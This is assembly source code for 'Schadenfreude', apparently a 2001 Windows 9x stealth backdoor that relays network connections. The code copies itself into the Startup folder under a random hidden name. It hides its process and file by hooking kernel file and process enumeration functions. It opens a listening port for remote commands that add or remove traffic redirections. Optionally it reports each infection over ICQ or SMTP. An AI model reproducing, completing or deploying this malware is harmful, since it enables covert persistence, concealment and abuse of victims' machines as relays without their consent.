;Schadenfreude - Stealth IP/Port redirector
;Version 0.2
;(c) Vecna 2001
BITS 32



%define    PORT         1081
%define    VERSION      "0.3"

;%define    ICQ
;%define    MAIL

;%define    NO_INSTALL



%ifdef     ICQ
%ifdef     MAIL
%error     "Error! Both ICQ and MAIL enabled!"
%endif
%endif

%define    SLEEP_TIME   1*60*1000

%ifdef     ICQ
%define    UIN          "12345678"
%endif

%ifdef     MAIL
%define    MAILTO       "12345678@123456789012.123"
%define    SMTP         127,0,0,1
%endif

%define    RVA_diff     1000h-200h
%define    imagebase    00400000h
%define    run_RVA      RVA_diff+imagebase
%define    jmp_         jmp short

%include "header.i"

%include "schaden.i"

%ifdef ICQ
icqpage db "http://wwp.icq.com/scripts/WWPMsg.dll?from=&fromemail=&subject=&body=&to="
        db UIN, 0
icqurl  equ icqpage+imagebase
%elifdef MAIL
txtbody1 db "Schadenfreude "
        db VERSION,13,10
        db ".",0
txtbody equ txtbody1+imagebase
mailto1 db "MAIL TO: <"
        db MAILTO
        db ">",0
mailto  equ mailto1+imagebase
from1   db "MAIL FROM: <>",0
from    equ from1+imagebase
helo1   db "HELO localhost",0
helo    equ helo1+imagebase
%endif

registry db "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",0
regentry equ registry+imagebase

times 200h-($-$$) db -1

%include "import.i"

report         equ api301
vxdcall0       equ import
peheader       equ import+4
forward_chain  equ import+8
first_redirect equ import+(5*4)


code:
       push byte 1
       sub ebp, ebp
       push byte 3
       call dword [SetErrorMode]
       sub esp, byte 7fh
       push esp
       push dword 0101h
       call dword [WSAStartup]
       add esp, byte 7fh
       push ebp
       push ebp
       push ebp
       push ebp
       push ebp
       call dword [PeekMessageA]
       pop dword [no_socks]
%ifdef NO_INSTALL
       jmp .checkinet
%endif
       mov ebx, 104h
       sub esp, ebx
       mov esi, esp
       sub esp, ebx
       mov edi, esp
       mov eax, [forward_chain+run_RVA]
       mov ebx, [eax+3ch]
       lea eax, [eax+ebx-4]
       cmp dword [eax], byte -1
       mov [peheader+run_RVA], eax
       push esp
       push esp
       push byte 1
       push ebp
       push dword regentry
       push dword 80000002h
       je .jmpexit2win2
       call dword [RegOpenKeyExA]
       test eax, eax
       push ebx
       push esp
       push esi
       push ebp
       push ebp
       push dword regkey
       push dword [esp+6*4]
       je .skip_exit2win
  .jmpexit2win2:
       jmp_ .jmpexit2win
  .skip_exit2win:
       call dword [RegQueryValueExA]
       push dword [esp+1*4]
       call dword [RegCloseKey]
       push ebx
       push edi
       push ebp
       call dword [GetModuleFileNameA]
       pop ecx
       pop ebx
       mov ebx, esi
       mov [esp+ecx-1], ebp
  .cmpname:
       lodsb
       mov ah, [edi]
       inc edi
       or ax, 2020h
       sub al, ah
       jnz .namedone
       loop .cmpname
  .namedone:
       jecxz .installed
       push byte 8
       lea edi, [esi+ecx-2]
       mov al, "\"
       stosb
       call dword [GetTickCount]
       pop ecx
  .nameloop:
       and al, 0111b
       sub al, -"0"
       stosb
       rol eax, cl
       sub eax, esp
       loop .nameloop
       mov eax, ".EXE"
       stosd
       mov eax, ebp
       stosd
       mov eax, esp
       push ebp
       push ebx
       push eax
       call dword [CopyFileA]
       push byte 3
       push ebx
       call dword [SetFileAttributesA]
       push ebp
       push ebx
       call dword [WinExec]
  .jmpexit2win:
       jmp .exit2win

  .installed:
       push dword 104h
       push ebx
       push ebp
       call dword [GetModuleFileNameA]
       mov ecx, [ebx+eax-8-4]
       mov [check_name.name1+run_RVA], ecx
       mov ecx, [ebx+eax-4-4]
       mov [check_name.name2+run_RVA], ecx
       add esp, 104h*2
       push byte 1
       push ebp
       call dword [RegisterServiceProcess]
       mov edi, [peheader+run_RVA]
       mov ebx, [forward_chain+run_RVA]
       mov esi, [edi+78h+4]
       mov esi, [esi+ebx+1ch]
       mov ecx, [esi+ebx]
       add ecx, ebx
       mov [vxdcall0+run_RVA], ecx
       push edi
       call deprotect
       mov dword [edi], -1
       mov esi, Process32First
       lodsd
       mov [p32f+run_RVA], eax
       lodsd
       mov [p32n+run_RVA], eax
       lodsd
       mov [fff+run_RVA], eax
       lodsd
       mov [fnf+run_RVA], eax
       movzx ecx, word [edi+4+6]
       lea esi, [edi+4+0f8h]
       mov edx, implant_size+32
  .section_loop:
       mov eax, [esi+36]
       and eax, 0C0000040h
       cmp eax, 0C0000040h
       jne .next_section
       mov eax, [esi+16]
       mov edi, [esi+8]
       sub eax, edi
       cmp eax, edx
       jb .next_section
       add [esi+8], edx
       add edi, [esi+12]
       add edi, ebx
       jmp_ .copy_code
  .next_section:
       add esi, byte 40
       loop .section_loop
       jmp .jmpexit2win

  .copy_code:
       lea ecx, [edx-32]
       mov edx, edi
       mov esi, fff_entry+run_RVA
       cld
       rep movsb
       mov edi, [fff+run_RVA]
       lea esi, [edx+(fff_code-fff_entry)]
       call patch
       mov edi, [fnf+run_RVA]
       lea esi, [edx+(fnf_code-fff_entry)]
       call patch
       add dword [edi-4], byte (fnf_entry-fff_entry)
       mov edi, [p32f+run_RVA]
       lea esi, [edx+(p32f_code-fff_entry)]
       call patch
       add dword [edi-4], byte (p32f_entry-fff_entry)
       mov edi, [p32n+run_RVA]
       lea esi, [edx+(p32n_code-fff_entry)]
       call patch
       add dword [edi-4], (p32n_entry-fff_entry)
  .checkinet:
       call inet_up
       jz .online
%ifdef NO_INSTALL
       jmp_ .online
%endif
       push dword SLEEP_TIME
       call dword [Sleep]
       mov byte [report+run_RVA], 0
       jmp_ .checkinet
  .online:
       cmp byte [report+run_RVA], 0
%ifdef MAIL
       jne near .reportdone
%elifdef ICQ
       jne .reportdone
%endif
%ifndef NO_INSTALL
%include "warn.i"
%endif
       inc byte [report+run_RVA]
  .reportdone:
       push byte IPPROTO_TCP
       push byte SOCK_STREAM
       push byte PF_INET
       call dword [socket]
       mov edi, dword main_socket+run_RVA
       stosd
       mov ebx, eax
       inc eax
       jz .jmp2chkinet0
       mov ax, AF_INET
       stosw
       mov ax, PORT
       xchg al, ah
       stosw
       push byte 16
       push dword main_sockaddr
       push ebx
       call dword [bind]
       test eax, eax
       jnz .jmp2chkinet
       push byte 3
       push ebx
       call dword [listen]
       test eax, eax
       jnz .jmp2chkinet
       push ebp
       push ebp
       push ebp
       push dword no_socks
       push ebp
       call dword [select]
       dec eax
       jnz .jmp2chkinet
       push ebp
       push ebp
       push ebx
       call dword [accept]
       mov edi, eax
       inc eax
       jz .jmp2chkinet
       mov eax, dword control_thread+run_RVA
       call control_thread.make_thread
  .jmp2chkinet:
       push dword [main_socket+run_RVA]
       call dword [closesocket]
  .jmp2chkinet0:
       jmp .checkinet

  .exit2win:
       call dword [WSACleanup]
       push ebp
       call dword [ExitProcess]


control_thread:
       pushad
       sub ebp, ebp
       mov ebx, [esp+8*4+4]
       sub esp, byte 07fh
       push ebp
       push byte .hello1-.hello0
       call .hello1
  .hello0 db "Schadenfreude "
       db VERSION
       db 13,10,0
  .hello1:
       push ebx
       call dword [send]

  .wait_datain:
       push ebx
       push byte 1
       mov eax, esp
       push ebp
       push ebp
       push ebp
       push eax
       push ebp
       call dword [select]
       dec eax
       pop eax
       pop eax
       mov esi, esp
       jnz .exit_commandthread0
       push ebp
       push byte 07fh
       push esi
       push ebx
       call dword [recv]
       inc eax
       jnz .quit
  .exit_commandthread0:
       jmp .exit_commandthread

  .quit:
       lodsd
       cmp eax, "quit"
       jne .list
       push ebp
       push byte .bye1-.bye0
       call .bye1
  .bye0 db "Bye",13,10,0
  .bye1:
       push ebx
       call dword [send]
       jmp_ .exit_commandthread0

  .list:
       cmp eax, "list"
       jne near .add
       mov eax, dword 0
  redirections equ $-4
       shl eax, 5
       push eax
       push byte 40h
       call dword [GlobalAlloc]
       test eax, eax
       jz .wait_datain3
       xchg eax, esi
       mov edi, esi
       mov ecx, [first_redirect+run_RVA]
  .next_redirect:
       jecxz .sendlist
       mov al, "-"
       cmp dword [ecx+24], ebp
       je .noinuse
       mov al, "*"
  .noinuse:
       stosb
       mov eax, [ecx+4]
       call value2decimal
       push byte 4
       mov al, ":"
       stosb
       mov eax, [ecx+8]
       pop edx
  .subnet:
       rol eax, 8
       push eax
       movzx eax, al
       call value2decimal
       mov al, "."
       stosb
       pop eax
       dec edx
       jnz .subnet
       mov byte [edi-1], ":"
       mov eax, [ecx+12]
       call value2decimal
       mov ax, 0a0dh
       stosw
       mov ecx, [ecx+0]
       jmp_ .next_redirect
  .sendlist:
       sub eax, eax
       stosb
       sub edi, esi
       dec edi
       jnz .no_empty
       push byte 7
       mov dword [esi], "empt"
       mov dword [esi+4], 000a0d79h
       pop edi
  .no_empty:
       inc edi
       push ebp
       push edi
       push esi
       push ebx
       call dword [send]
       push esi
       call dword [GlobalFree]
  .wait_datain3:
       jmp .wait_datain2

  .add:
       cmp eax, "add:"
       jne near .rem
       push byte 4
       push byte 32
       push byte 40h
       call dword [GlobalAlloc]
       test eax, eax
       pop ecx
       jz .wait_datain3
       mov edi, eax
       xchg [first_redirect+run_RVA], eax
       mov [edi+0], eax
  .next:
       shl edx, 8
       call string2value
       mov dl, al
       loop .next
       mov [edi+8], edx
       call string2value
       mov [edi+12], eax
       call dword [GetTickCount]
       and eax, 0fffh
       add eax, 50000
       mov [edi+4], eax
       push eax
       mov eax, dword work_thread+run_RVA
       call .make_thread
       inc dword [redirections+run_RVA]
       mov [edi+16], eax
       pop eax
       mov edi, esp
       call value2decimal
       sub eax, eax
       stosb
       mov eax, esp
       sub edi, eax
       push ebp
       push ebp
       push edi
       jmp_ .send

  .rem:
       sub eax, "rem:"
       jne .unknow
       call string2value
       mov edi, first_redirect+run_RVA
  .search_delete:
       mov ecx, [edi+0]
       jecxz .wait_datain2
       cmp eax, [ecx+4]
       je .delete
       xchg edi, ecx
       jmp_ .search_delete
  .delete:
       mov eax, [ecx+0]
       mov [edi+0], eax
       push dword [ecx+24]
       push dword [ecx+20]
       push ebp
       push dword [ecx+16]
       push ecx
       push dword [ecx+28]
       call dword [GlobalFree]
       call dword [GlobalFree]
       call dword [TerminateThread]
       call dword [closesocket]
       call dword [closesocket]
       dec dword [redirections+run_RVA]
  .wait_datain2:
       jmp_ .wait_datain1

  .unknow:
       push dword 000a0d3fh
       mov eax, esp
       push ebp
       push byte 4
  .send:
       push eax
       push ebx
       call dword [send]
       pop eax
  .wait_datain1:
       jmp .wait_datain

  .exit_commandthread:
       add esp, byte 07fh
       push ebx
       call dword [closesocket]
       popad
       ret 4

  .make_thread:
       push ebp
       push esp
       push ebp
       push edi
       push eax
       push ebp
       push ebp
       call dword [CreateThread]
       pop ecx
       ret


%include "redirect.i"


patch:
       push edi
       xchg esi, edi
       movsd
       movsd
       mov edi, [esp]
       call deprotect
       mov al, 0e9h
       stosb
       stosd
       mov eax, edx
       sub eax, edi
       mov [edi-4], eax
       ret


deprotect:
       pushad
       mov eax, [esp+(8*4)+4]
       shr eax, 12
       push dword 020060000h
       push ebp
       push byte 1
       push eax
       push dword 00001000dh
       call dword [vxdcall0+run_RVA]
       popad
       ret 4


value2decimal:
       push ebx
       push edx
       push byte 10
       xor edx, edx
       pop ebx
       div ebx
       push edx
       or eax, eax
       jz .done
       call value2decimal
 .done:
       pop eax
       add al, "0"
       stosb
       pop edx
       pop ebx
       ret


string2value:
       push ecx
       sub ecx, ecx
       sub eax, eax
  .next_digit:
       lodsb
       sub al, "0"
       jc .dec_done
       cmp al, 9
       ja .dec_done
       imul ecx, ecx, 10
       add ecx, eax
       jmp_ .next_digit
  .dec_done:
       xchg eax, ecx
       pop ecx
       ret


inet_up:
       mov eax, ebp
       sub esp, byte 7fh
       push esp
       xchg eax, [esp]
       push eax
       call dword [InternetGetConnectedState]
       add esp, byte 7fh
       dec eax
       ret


registr2 db "Common Startup",0
regkey   equ registr2+run_RVA


%include "implant.i"


code_end:


pad    times 0e00h-($-$$) db 0

